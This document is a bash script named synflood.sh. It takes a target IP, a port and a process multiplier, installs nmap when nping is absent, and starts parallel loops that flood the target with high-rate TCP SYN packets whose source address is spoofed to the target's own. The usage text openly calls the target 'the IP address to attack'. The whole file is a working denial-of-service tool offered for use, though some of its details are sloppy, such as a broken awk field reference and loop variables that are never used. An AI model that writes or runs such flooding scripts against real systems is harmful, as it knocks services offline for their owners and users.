#!/usr/bin/sudo /bin/bash
i=0
if type lsb_release >/dev/null 2>&1; then
  distro=$(lsb_release -i -s)
elif [ -e /etc/os-release ]; then
  distro=$(awk -F= '$1 == "ID" {print 2}' /etc/os-release)
else
  echo "Error: Cannot find release file"; exit 1
fi

target=$1
port=$2
mul=$3

flood() {
  for i in {0..255}; do
    for j in $i.{0..255}; do
      for k in $j.{0..255}; do
        for l in $k.{0..255}; do
          nping -c 1 --rate 90000 --tcp --flags SYN -S $target -g $port $target
        done
      done
    done
  done
}

if [ -z "$(which nping)" ]; then
  echo "nmap not installed; installing"
  case $distro in
      ubuntu*) apt-get -y install nmap ;;
      debian*) apt-get -y install nmap ;;
      mint*)   apt-get -y install nmap ;;
      kali*)   apt-get -y install nmap ;;
      fedora*) yum install nmap; dnf install nmap ;;
      suse*)   zypper addrepo https://download.opensuse.org/repositories/network:utilities/openSUSE_Leap_42.3/network:utilities.repo; zypper refresh; zypper install nmap ;;
      centos*) yum install nmap ;;
      rhel*)   yum install nmap ;;
      arch*)   pacman -Sy nmap ;;
      gentoo*) USE="-gtk -gnome" emerge -pv nmap ;;
      *)       echo "Error: Unknown distribution $distro"; exit 1 ;;
  esac
else
  if [ -z $target ]; then
    echo "Usage: ./synflood.sh TARGET PORT MULTIPLIER, where \
    TARGET is the IP address to attack, \
    PORT is the port to attack on the target, \
    and MULTIPLIER is the number of simultaneous process to run."
  elif [ -z $port ]; then
    echo "Usage: ./synflood.sh TARGET PORT MULTIPLIER, where \
    TARGET is the IP address to attack, \
    PORT is the port to attack on the target, \
    and MULTIPLIER is the number of simultaneous process to run."
  elif [ -z $mul ]; then
    echo "Usage: ./synflood.sh TARGET PORT MULTIPLIER, where \
    TARGET is the IP address to attack, \
    PORT is the port to attack on the target, \
    and MULTIPLIER is the number of simultaneous process to run."
  else
    m=0
    while [ $m -lt $mul ]; do
      flood &
      m=$[$m+1]
    done
  fi
fi
